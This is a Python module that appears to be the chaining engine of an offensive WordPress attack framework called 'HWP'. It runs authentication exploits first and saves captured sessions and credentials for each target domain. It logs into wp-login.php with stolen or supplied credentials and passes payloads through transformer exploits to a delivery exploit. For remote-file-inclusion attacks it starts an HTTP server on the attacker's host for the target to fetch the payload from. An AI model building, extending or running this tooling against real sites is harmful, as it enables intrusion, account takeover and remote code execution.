"""
HWP Chain - Resolves and executes exploit chains.

Chain resolution (right-to-left):
    payload → rightmost exploit (capability match) → transformers → delivery → target

AUTH exploits run first, providing sessions for auth_required exploits.
Transformer exploits (delivers != None) wrap instructions before delivery.

Output rules:
    Exploit:   info/success = verbose only (-v), error = always
    Payload:   info/success/error = always
    Framework: result dump = very verbose only (-vv), errors = always
"""

import re
import sys
import traceback
from lib.exploit import Exploit, resolve_capability
from lib.payload import Payload, resolve_method
from lib.result import Result
from lib import output
from lib import store


def _resolve_placeholder(instruction, prev_result):
    """Replace {prev.X} placeholders with values from previous Result."""
    if prev_result is None or not isinstance(instruction, str):
        return instruction

    def replacer(match):
        field = match.group(1)
        val = getattr(prev_result, field, None)
        if val is None:
            output.warn(f"Placeholder {{prev.{field}}} has no value")
            return match.group(0)
        return str(val)

    return re.sub(r"\{prev\.(\w+)\}", replacer, instruction)


def match_payload_to_exploit(exploit_classes, payload_class):
    """
    Find which exploit the payload should attach to.
    Searches right-to-left. Returns (index, matched_method, needs_server) or (None, None, False).

    Matching rules:
        - Direct match: exploit cap == payload method → use directly
        - RFI fallback: exploit needs RFI, payload has AFU but not RFI →
          framework will serve payload content via HTTP server
    """
    if payload_class is None:
        return None, None, False

    payload_methods = [resolve_method(m) for m in payload_class.methods]

    # First pass: look for direct matches
    for i in range(len(exploit_classes) - 1, -1, -1):
        cap = resolve_capability(exploit_classes[i].capability)
        if cap in payload_methods:
            return i, cap, False

    # Second pass: RFI/SSRF exploit + AFU payload → server fallback
    for i in range(len(exploit_classes) - 1, -1, -1):
        cap = resolve_capability(exploit_classes[i].capability)
        if cap in ("RFI", "SSRF") and "AFU" in payload_methods:
            return i, "AFU", True  # method=AFU (get content), but serve via HTTP

    return None, None, False


def _dump_result(result, verbose):
    """Dump Result fields — only at -vv level."""
    if verbose < 2:
        return
    output.debug(f"Result: success={result.success}")
    for field in ("output", "rows_affected", "insert_id", "url", "path",
                  "session", "credentials", "message"):
        val = getattr(result, field, None)
        if val is not None:
            output.debug(f"  .{field} = {val!r}")


def _wp_login(target, credentials, verbose=0):
    """Attempt WordPress login with credentials, return session cookies or None."""
    import requests

    username = credentials.get("user") or credentials.get("username", "")
    password = credentials.get("pass") or credentials.get("password", "")

    if not username or not password:
        return None

    login_url = f"{target}/wp-login.php"

    try:
        resp = requests.post(login_url, data={
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{target}/wp-admin/",
            "testcookie": "1",
        }, allow_redirects=False, timeout=15)
    except Exception as e:
        if verbose:
            output.warn(f"wp-login.php request failed: {e}")
        return None

    # WordPress sets cookies on successful login and redirects (302)
    cookies = dict(resp.cookies)

    # Check for wordpress_logged_in cookie
    has_auth = any(k.startswith("wordpress_logged_in") for k in cookies)

    if has_auth:
        if verbose:
            output.info(f"Logged in as {username} via wp-login.php")
        return cookies
    else:
        output.warn(f"wp-login.php: login failed for {username}")
        return None


def _run_exploit(ecls, target, domain, options, session_cookies, credentials, verbose, instruction):
    """Run a single exploit with error handling. Returns Result or exits."""
    instance = ecls(
        target=target, domain=domain, options=options,
        session_cookies=session_cookies, credentials=credentials,
        verbose=verbose,
    )

    try:
        result = instance.exploit(instruction)
    except Exception:
        output.error(f"Exploit({ecls.type}/{ecls.slug}) failed with the following error:")
        traceback.print_exc()
        sys.exit(1)

    if result is None:
        output.error(f"Exploit({ecls.type}/{ecls.slug}) did not return a result.")
        output.error("Exploits need to return through self.result()")
        sys.exit(1)

    if not isinstance(result, Result):
        output.error(f"Exploit({ecls.type}/{ecls.slug}) returned {type(result).__name__} instead of Result.")
        output.error("Exploits need to return through self.result()")
        sys.exit(1)

    return result


def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0):
    """
    Execute an exploit chain.

    Args:
        exploit_classes: List of Exploit subclasses (CLI order: left=first, right=last)
        payload_class:   Payload subclass or None
        target:          Normalized target URL
        domain:          Target domain
        options:         Dict of extra CLI args
        verbose:         0 = normal, 1 = verbose (-v), 2 = very verbose (-vv)
    """
    # ── Phase 1: Load stored auth ─────────────────────────────────────
    session_cookies = store.load_session(domain)
    credentials = store.load_credentials(domain)

    # CLI-provided auth overrides
    if options.get("cookie"):
        session_cookies = _parse_cookie_string(options["cookie"])
        store.save_session(domain, session_cookies)

    if options.get("user") and options.get("pass"):
        credentials = {"user": options["user"], "pass": options["pass"]}

    # ── Phase 2: Separate AUTH exploits from chain exploits ───────────
    auth_exploits = []
    chain_exploits = []

    for ecls in exploit_classes:
        cap = resolve_capability(ecls.capability)
        if cap == "AUTH":
            auth_exploits.append(ecls)
        else:
            chain_exploits.append(ecls)

    # ── Phase 3: Run AUTH exploits first ──────────────────────────────
    for ecls in auth_exploits:
        result = _run_exploit(
            ecls, target, domain, options,
            session_cookies, credentials, verbose,
            instruction=None,
        )
        _dump_result(result, verbose)

        if result.success:
            if result.session:
                session_cookies = result.session
                store.save_session(domain, session_cookies)
            if result.credentials:
                credentials = result.credentials
                store.save_credentials(domain, credentials)
        else:
            # Exploit's self.error() already printed details
            return []

    # ── Phase 4: AUTH-only run (no chain exploits) ────────────────────
    if not chain_exploits:
        return []

    # ── Phase 4.5: Credentials → Session bridge ──────────────────────
    # If we have credentials but no session cookies, attempt wp-login.php
    if credentials and not session_cookies:
        session_cookies = _wp_login(target, credentials, verbose)
        if session_cookies:
            store.save_session(domain, session_cookies)

    # ── Phase 5: Check auth requirements ──────────────────────────────
    for ecls in chain_exploits:
        if ecls.auth_required and not session_cookies:
            output.error(f"Exploit {ecls.info_str()} requires authentication.")
            output.error("Add an AUTH exploit to the chain, use --cookie, or use --user/--pass.")
            return []

    # ── Phase 6: Match payload to exploit ─────────────────────────────
    payload_idx, matched_method, needs_rfi_server = match_payload_to_exploit(chain_exploits, payload_class)

    if payload_class is not None and payload_idx is None:
        output.error("Payload is not compatible with any exploit in the chain.")
        output.warn(f"  Payload needs: {payload_class.methods}")
        for ecls in chain_exploits:
            output.warn(f"  Exploit offers: {ecls.capability}")
        return []

    # ── Phase 7: Get instructions from payload ────────────────────────
    rfi_server = None
    if payload_class and matched_method:
        payload_instance = payload_class(options=options, verbose=verbose)
        payload_instance.method = matched_method
        try:
            instructions = payload_instance.instructions()
        except Exception:
            output.error(f"Payload({payload_class.name}) failed with the following error:")
            traceback.print_exc()
            sys.exit(1)

        if instructions is None:
            instructions = []
        if isinstance(instructions, str):
            instructions = [instructions]

        # RFI server fallback: exploit needs RFI, payload gave us AFU content
        # Spin up HTTP server to serve the content, replace instructions with URL
        if needs_rfi_server and instructions:
            lhost = options.get("lhost", "")
            lport = options.get("lport", "8888")
            if not lhost:
                output.error("RFI server fallback requires --lhost (your reachable IP)")
                output.error("The target needs to fetch the payload from this address.")
                return []

            from lib.rfi_server import RFIServer
            content = instructions[0]  # AFU payload content
            rfi_server = RFIServer(content, lhost, lport)
            url = rfi_server.start()
            if not url:
                return []
            instructions = [url]
    else:
        instructions = [None]

    # ── Phase 8: Identify delivery exploit and transformers ───────────
    delivery_idx = None
    for i, ecls in enumerate(chain_exploits):
        if ecls.delivers is None:
            delivery_idx = i
            break

    if delivery_idx is None:
        output.error("No delivery exploit in chain (all exploits are transformers).")
        return []

    delivery_cls = chain_exploits[delivery_idx]
    transformer_classes = [
        ecls for i, ecls in enumerate(chain_exploits) if i != delivery_idx
    ]
    transformer_classes.reverse()

    # ── Phase 9: Execute ──────────────────────────────────────────────
    all_results = []
    prev_result = None

    try:
        for instruction in instructions:
            instruction = _resolve_placeholder(instruction, prev_result)

            # Pass through transformers (right-to-left)
            current = instruction
            for tcls in transformer_classes:
                t_result = _run_exploit(
                    tcls, target, domain, options,
                    session_cookies, credentials, verbose,
                    instruction=current,
                )
                _dump_result(t_result, verbose)

                if t_result.success and t_result.output:
                    current = t_result.output
                else:
                    return all_results

            # Deliver to target
            result = _run_exploit(
                delivery_cls, target, domain, options,
                session_cookies, credentials, verbose,
                instruction=current,
            )
            _dump_result(result, verbose)

            all_results.append(result)
            prev_result = result

            # Silently store session/credentials if provided
            if result.session:
                store.save_session(domain, result.session)
            if result.credentials:
                store.save_credentials(domain, result.credentials)

        # Post-execution — payload handles its own output
        if payload_class and matched_method:
            try:
                payload_instance.report(all_results)
            except Exception:
                output.error(f"Payload({payload_class.name}) failed with the following error:")
                traceback.print_exc()
                sys.exit(1)
    finally:
        # Clean up RFI server if it was started
        if rfi_server:
            rfi_server.stop()

    return all_results


def _parse_cookie_string(cookie_str):
    """Parse 'key=val; key2=val2' into a dict."""
    cookies = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            key, val = part.split("=", 1)
            cookies[key.strip()] = val.strip()
    return cookies
